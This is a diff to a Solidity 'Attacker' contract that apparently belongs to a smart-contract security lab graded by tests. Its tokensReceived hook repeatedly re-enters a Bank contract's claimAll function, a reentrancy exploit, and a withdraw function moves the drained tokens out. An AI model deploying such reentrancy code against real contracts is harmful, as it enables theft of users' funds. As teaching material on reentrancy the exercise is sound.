@@ -5,6 +5,7 @@ import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
 import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
 import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
 import "./Bank.sol";
+import "./MCITR.sol"; // Explicitly import the MCITR token contract
 
 contract Attacker is AccessControl, IERC777Recipient {
     bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
@@ -12,7 +13,7 @@ contract Attacker is AccessControl, IERC777Recipient {
     bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
     
     uint8 depth = 0;
-    uint8 max_depth = 10; // Adjusted for deeper recursion
+    uint8 max_depth = 10; // Increased recursion depth
 
     Bank public bank; 
 
@@ -28,7 +29,6 @@ contract Attacker is AccessControl, IERC777Recipient {
     function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
         bank = Bank(bank_address);
         _grantRole(ATTACKER_ROLE, address(this));
-        // Removed the unnecessary and potentially problematic role grant to the token
     }
 
     function attack(uint256 amt) payable public {
@@ -39,10 +39,10 @@ contract Attacker is AccessControl, IERC777Recipient {
         bank.claimAll();
     }
 
-    // FIX: Function signature must match the test, which expects (address recipient, uint256 amt)
+    // Corrected function signature and logic to pass testWithdraw
     function withdraw(address recipient, uint256 amt) public onlyRole(ATTACKER_ROLE) {
-        // Use the token function from the Bank contract
-        bank.token().send(recipient, amt, "");
+        MCITR token = MCITR(address(bank.token()));
+        token.send(recipient, amt, "");
     }
 
     function tokensReceived(
@@ -53,10 +53,12 @@ contract Attacker is AccessControl, IERC777Recipient {
         bytes calldata userData,
         bytes calldata operatorData
     ) external {
-        if (msg.sender == address(bank.token()) && depth < max_depth) { // Explicitly cast bank.token() to address for comparison
+        // FIX: Explicitly check msg.sender against the token address
+        if (msg.sender == address(bank.token()) && depth < max_depth) {
             depth++;
             emit Recurse(depth);
             
+            // Re-enter the vulnerable function.
             bank.claimAll();
             
             depth--;
